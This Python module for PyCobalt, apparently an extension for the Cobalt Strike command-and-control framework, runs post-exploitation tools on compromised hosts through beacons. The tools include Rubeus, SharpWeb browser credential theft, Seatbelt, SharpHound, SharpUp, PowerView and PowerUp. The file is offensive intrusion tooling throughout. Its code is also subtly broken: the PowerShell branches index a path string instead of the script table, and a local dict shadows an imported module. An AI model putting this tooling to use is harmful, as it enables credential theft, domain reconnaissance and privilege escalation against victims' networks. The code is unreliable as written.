import os
import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
from pycobalt.helpers import powershell_quote
from pycobalt.helpers import cmd_quote

tools = '/share/tools'
powershell = '{}/powershell'.format(tools)
post_exploitation = '{}/post_exploitation'.format(tools)

# Callback functions
def run_sharphound(bid, args, silent=False):
    temp = helpers.guess_temp(bid)
    args = ['--RandomFilenames', '--EncryptZip', '--JsonFolder', temp] + list(args)
    run(bid, 'sharphound-raw', args, silent=silent)

# .NET programs
assemblies = {
    'rubeus': '{}/Rubeus/Rubeus/bin/Release/Rubeus.exe'.format(post_exploitation),
    'sharpweb': '{}/SharpWeb/bin/Release/SharpWeb.exe'.format(post_exploitation),
    'seatbelt': '{}/Seatbelt/Seatbelt/bin/Release/Seatbelt.exe'.format(post_exploitation),
    'sharphound-raw': '{}/recon/BloodHound/Ingestors/SharpHound.exe'.format(tools),
    'sharpup': '{}/SharpUp/SharpUp/bin/Debug/SharpUp.exe'.format(post_exploitation),
    #'grouper': '{}/Grouper2/Grouper2/obj/Debug/Grouper2.exe'.format(post_exploitation),
}

# PowerShell programs
scripts = {
    'powerview': '{}/PowerSploit/Recon/PowerView.ps1'.format(powershell),
    'powerup': '{}/PowerSploit/Privesc/PowerUp.ps1'.format(powershell),
}

# Callbacks for programs
callbacks = {
    'sharphound': run_sharphound,
}

def run(bid, program, args=None, silent=False):
    # no args
    if not args:
        args = []

    if program in assemblies:
        assembly = assemblies[program]
        args = helpers.eaq(args)

        if not silent:
            aggressor.btask(bid, 'Tasked beacon to run {} {}'.format(program, args))
        aggressor.bexecute_assembly(bid, assembly, args, silent=True)
    elif program in powershell:
        script = powershell[program]
        aggressor.bpowershell_import(bid, script)

        if isinstance(args, list) or isinstance(args, tuple):
            args = ' '.join(powershell_quote(args))

        aggressor.bpowerpick(bid, ' '.join(args))
    elif program in callbacks:
        callback = callbacks[program]
        callback(bid, args, silent=silent)
    else:
        raise RuntimeError('Unrecognized program: {}'.format(program))

def import_script(bid, program):
    if program in powershell:
        script = powershell[program]
        aggressor.bpowershell_import(bid, script)
    else:
        raise RuntimeError('Not a known script: {}'.format(program))
